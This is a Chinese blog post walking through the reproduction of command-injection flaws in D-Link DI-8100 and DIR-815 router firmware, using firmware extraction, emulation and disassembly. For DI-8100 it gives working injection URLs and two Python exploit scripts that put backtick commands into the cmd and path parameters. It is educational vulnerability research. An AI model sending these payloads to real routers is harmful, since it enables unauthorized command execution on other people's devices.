<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>IOT入门--路由器命令执行漏洞 | XiDP</title><meta name="author" content="XiDP"><meta name="copyright" content="XiDP"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="D-Link DI_8100命令执行漏洞复现所需工具Burp Suite​​-Linux下载BurpSuite v2024.10汉化无cmd框版（2024.11.03更新） - 吾爱破解 - 52pojie.cn 配置Burp Suite​​教程Burp..."><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "IOT入门--路由器命令执行漏洞",
  "url": "http://example.com/2025/07/13/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/",
  "image": "http://example.com/img/Qhead.png",
  "datePublished": "2025-07-12T16:00:00.000Z",
  "dateModified": "2025-07-21T15:11:30.663Z",
  "author": [
    {
      "@type": "Person",
      "name": "XiDP",
      "url": "http://example.com/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/Qhead.png"><link rel="canonical" href="http://example.com/2025/07/13/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":5,"unescape":false,"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'IOT入门--路由器命令执行漏洞',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><link rel="stylesheet" href="/css/loading.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><div class="loading-img"></div><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
    document.getElementById('loading-box').classList.remove("loaded")

  }
}
window.addEventListener('load',()=> { preloader.endLoading() })

if (false) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><script>window.paceOptions = {
  restartOnPushState: false
}

btf.addGlobalFn('pjaxSend', () => {
  Pace.restart()
}, 'pace_restart')

</script><link rel="stylesheet" href="/css/progress_bar.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js/pace.min.js"></script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/Qhead.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">20</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">21</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/yu2.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">XiDP</span></a><a class="nav-page-title" href="/"><span class="site-name">IOT入门--路由器命令执行漏洞</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">IOT入门--路由器命令执行漏洞</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-07-12T16:00:00.000Z" title="发表于 2025-07-13 00:00:00">2025-07-13</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-07-21T15:11:30.663Z" title="更新于 2025-07-21 23:11:30">2025-07-21</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/IOT/">IOT</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CVE%E5%A4%8D%E7%8E%B0/">CVE复现</a></span></div><div class="meta-secondline"></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><div id="post-outdate-notice" data="{&quot;limitDay&quot;:100,&quot;messagePrev&quot;:&quot;It has been&quot;,&quot;messageNext&quot;:&quot;days since the last update, the content of the article may be outdated.&quot;,&quot;postUpdate&quot;:&quot;2025-07-21 23:11:30&quot;}" hidden></div><h2 id="D-Link-DI-8100命令执行漏洞复现"><a href="#D-Link-DI-8100命令执行漏洞复现" class="headerlink" title="D-Link DI_8100命令执行漏洞复现"></a>D-Link DI_8100命令执行漏洞复现</h2><h3 id="所需工具"><a href="#所需工具" class="headerlink" title="所需工具"></a><strong>所需工具</strong></h3><p><strong>Burp Suite​</strong>​-Linux下载<br><a target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-1544866-1-1.html">BurpSuite v2024.10汉化无cmd框版（2024.11.03更新） - 吾爱破解 - 52pojie.cn</a></p>
<p>配置<strong>Burp Suite​</strong>​教程<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/Hou_Lang_/article/details/122047560">Burp Suite代理和火狐浏览器的设置(超详细)_burpsuite firefox-CSDN博客</a></p>
<p>固件下载地址:<br><a target="_blank" rel="noopener" href="http://www.dlink.com.cn/techsupport/ProductInfo.aspx?m=DI-8100">http://www.dlink.com.cn/techsupport/ProductInfo.aspx?m=DI-8100</a><br><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/1.png"></p>
<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a><strong>漏洞分析</strong></h3><p>使用<code>binwalk</code>对固件进行分解</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -Me DI_8100-16.07.26A1.trx </span><br></pre></td></tr></table></figure>

<p>查看一下系统架构以及保护<br><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/2.png"></p>
<p><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/3.png"></p>
<p>下面使用FirmAE对固件进行仿真<br>进入FirmAE工具文件夹下，使用 <code>run.sh</code> 来进行启动</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> ./run.sh -d dlink &lt;DI_8100-16.07.26A1.trx的路径&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/4.png"></p>
<p>选择2进入终端，然后使用<code>ps</code>命令查看进程<br>我们发现程序启动之后 <code>jhttpd</code> 这个服务就启动了，所以我们主要的程序就是这个 <code>jhttpd</code> 服务,接下来我们也需要使用IDA分析这个程序<br><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/5.png"></p>
<p>下面来看官方的漏洞描述</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Description  </span><br><span class="line">A vulnerability, which was classified as critical, has been found in D-Link DI<span class="number">-8100</span> <span class="number">16.07</span>. This issue affects the function msp_info_htm of the file msp_info.htm. The manipulation of the argument cmd leads to command injection. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used. The identifier VDB<span class="number">-273521</span> was assigned to this vulnerability.</span><br><span class="line"></span><br><span class="line">描述  </span><br><span class="line">分类为致命的漏洞已在 D-Link DI<span class="number">-8100</span> <span class="number">16.07</span> 中发现。此问题会影响文件msp_info.htm的功能msp_info_htm。对参数 cmd 的操作会导致命令注入。攻击可能是远程发起的。该漏洞已向公众披露，并可能被使用。标识符 VDB<span class="number">-273521</span> 已分配给此漏洞。</span><br></pre></td></tr></table></figure>

<p>也就是说在 <code>msp_info.htm</code> 页面中 <code>cmd</code> 参数造成命令执行。<br>下面我们使用 <code>ida</code> 来分析 <code>jhttpd</code> 程序，<br>我们可以通过 <code>msp_info</code> 字符串来进行定位接着查找到 <code>msp_info_htm</code> 函数<br><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/6.png"><br><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/7.png"></p>
<p>函数存在的漏洞逻辑如下<br><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/8.png"><br>在 <code>msp_info_htm</code> 函数的开头，会从传进来的值中 <code>获取flag字符串</code>，如果成功获取到flag字符串然后会执行不同的命令，当我们传入的 <code>flag=cmd</code> 的时候就会执行到漏洞点，后续的 <code>cmd的内容</code> 就会被放入到 <code>system</code> 中执行</p>
<p>我们打开本机的浏览器，访问 <code>192.168.0.1:80</code> (需要注意FirmAE启动的这是内网，只能使用本机访问，后续还需要用到<strong>Burp Suite​</strong>​也需要提前准备好) D-Link路由器的初始账号和密码都是admin，直接登入后就可以得到下面这个页面<br><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/9.png"></p>
<p>我们先来试一下这个漏洞，我们按照这个漏洞的利用逻辑来写一个url进行注入<br><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/10.png"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">192.168</span><span class="number">.0</span><span class="number">.1</span>/msp_info.htm?flag=cmd&amp;cmd=`echo%<span class="number">20</span>aaaa&gt;a.txt`</span><br></pre></td></tr></table></figure>

<p>在浏览器输入这个url后，我们可以查看一下我们路由器的系统终端中是否多出了一个 <code>a.txt</code> 文件<br>可以发现已经执行了我们的命令，根目录下确实多出了<code>a.txt</code><br><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/11.png"></p>
<h3 id="exp编写"><a href="#exp编写" class="headerlink" title="exp编写"></a><strong>exp编写</strong></h3><p>重新回到登入的那个界面，然后刷新界面使用Burp Suite进行抓包<br><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/12.png"></p>
<p>然后按照抓包得到的信息编写下面的exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">target_url = <span class="string">&quot;http://192.168.0.1:80/msp_info.htm?flag=cmd&amp;cmd=`echo%20aaaa&gt;xidp.txt`&quot;</span></span><br><span class="line"></span><br><span class="line">auth_cookies = &#123;<span class="string">&quot;wys_userid&quot;</span>: <span class="string">&quot;admin,wys_passwd=520E1BFD4CDE217D0A5824AE7EA60632&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">request_headers = &#123;</span><br><span class="line">    <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate, br&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;keep-alive&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response = requests.get(</span><br><span class="line">    url=target_url,</span><br><span class="line">    headers=request_headers,</span><br><span class="line">    cookies=auth_cookies</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;攻击载荷成功发送！服务器响应正常&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;请求失败！状态码: <span class="subst">&#123;response.status_code&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>运行脚本<br><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/13.png"></p>
<p>随后我们可以查看根目录下文件发现已经执行命令生成了xidp.txt<br><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/14.png"></p>
<h3 id="简单调试"><a href="#简单调试" class="headerlink" title="简单调试"></a><strong>简单调试</strong></h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># mygdb.sh</span></span><br><span class="line"><span class="built_in">set</span> architecture mips</span><br><span class="line"><span class="built_in">set</span> endian little</span><br><span class="line"><span class="built_in">set</span> sysroot lib/</span><br><span class="line"><span class="built_in">set</span> solib-search-path lib/</span><br><span class="line">target remote 192.168.0.1:1337</span><br><span class="line">b *0x0044DBF4</span><br></pre></td></tr></table></figure>

<p>使用命令 <code>gdb-multiarch -x mygdb.sh</code></p>
<p><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/15.png"></p>
<p>这里A0寄存器作为第一次参数，然后调用system函数</p>
<h3 id="DI-8100的第二个命令执行漏洞"><a href="#DI-8100的第二个命令执行漏洞" class="headerlink" title="DI_8100的第二个命令执行漏洞"></a><strong>DI_8100的第二个命令执行漏洞</strong></h3><p>同样这个固件中还有另外一个命令执行漏洞在 <code>upgrade_filter_asp</code> 这个函数也存在<br><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/16.png"></p>
<p>同样回到登入页面然后抓包查看信息<br><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/17.png"></p>
<p>编写exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">target_url = <span class="string">&quot;http://192.168.0.1:80/upgrade_filter.asp?path=http://`ps%20%3e%20/xidp.txt`&quot;</span></span><br><span class="line"><span class="comment"># ps &gt; /xidp.txt</span></span><br><span class="line">auth_cookies = &#123;<span class="string">&quot;uid&quot;</span>: <span class="string">&quot;h3r4yvoOTp&quot;</span>, <span class="string">&quot;wys_userid&quot;</span>: <span class="string">&quot;admin,wys_passwd=520E1BFD4CDE217D0A5824AE7EA60632&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">request_headers = &#123;</span><br><span class="line">    <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate, br&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;keep-alive&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response = requests.get(</span><br><span class="line">    url=target_url,</span><br><span class="line">    headers=request_headers,</span><br><span class="line">    cookies=auth_cookies</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;攻击载荷成功发送！服务器响应正常&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;请求失败！状态码: <span class="subst">&#123;response.status_code&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
<p><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/18.png"></p>
<h2 id="D-Link-DIR-615-645-815-命令执行漏洞"><a href="#D-Link-DIR-615-645-815-命令执行漏洞" class="headerlink" title="D-Link DIR 615&#x2F;645&#x2F;815 命令执行漏洞"></a>D-Link DIR 615&#x2F;645&#x2F;815 命令执行漏洞</h2><h3 id="固件下载"><a href="#固件下载" class="headerlink" title="固件下载"></a><strong>固件下载</strong></h3><p>固件下载:<br><a target="_blank" rel="noopener" href="https://ftp.dlink.ru/pub/Router/DIR-815/Firmware/RevA/">https://ftp.dlink.ru/pub/Router/DIR-815/Firmware/RevA/</a><br><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/19.png"></p>
<h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a><strong>漏洞描述</strong></h3><p>官方漏洞描述:<br><a target="_blank" rel="noopener" href="https://www.cnvd.org.cn/flaw/show/CNVD-2018-01084">国家信息安全漏洞共享平台</a><br><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/20.png"></p>
<p>我们使用 <code>binwalk</code> 分解固件之后我们进入 <code>_DIR815A1_FW103b01.bin.extracted/squashfs-root/htdocs/web</code> 文件夹下，使用 <code>ls -la</code> 命令就可以看到，这个 <code>service.cgi</code> 实际是一个软连接，本质上是 <code>cgibin</code> 这个文件<br><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/21.png"></p>
<p>下面我们将这个 <code>cgibin</code> 放入ida中分析<br>同样通过字符串定位<br><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/22.png"></p>
<p>找到这个叫做 <code>servicecgi_main</code> 的函数<br><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/23.png"></p>
<p><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/24.png"></p>
<p><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/25.png"></p>
<p>也就是漏洞利用的路径为 <code>servicecgi_main -&gt; lxmldbc_system -&gt; system</code></p>
<p>下面详细分析漏洞的利用过程</p>
<p>在 <code>servicecgi_main函数</code> 的开头获取传参方式并进行判断<br>这里的逻辑为 如果为 <code>POST</code> 则进入 <code>大if</code> 将 <code>v2赋值为1024</code> 如果不为 <code>POST</code> 则进入 <code>大else</code> 然后判断是否为 <code>GET</code><br>如果为 <code>GET</code> 则将 <code>v2赋值为64</code> 如果既不是 <code>POST</code> 也不是 <code>GET</code> 则会执行 <code>goto LABEL_10</code><br><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/26.png"></p>
<p>而 <code>goto LABEL_10</code> 会导致直接跳过 <code>lxmldbc_system函数</code> ，所以我们的传参方式需要为 <code>POST</code> 或者 <code>GET</code> 其中之一<br><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/27.png"></p>
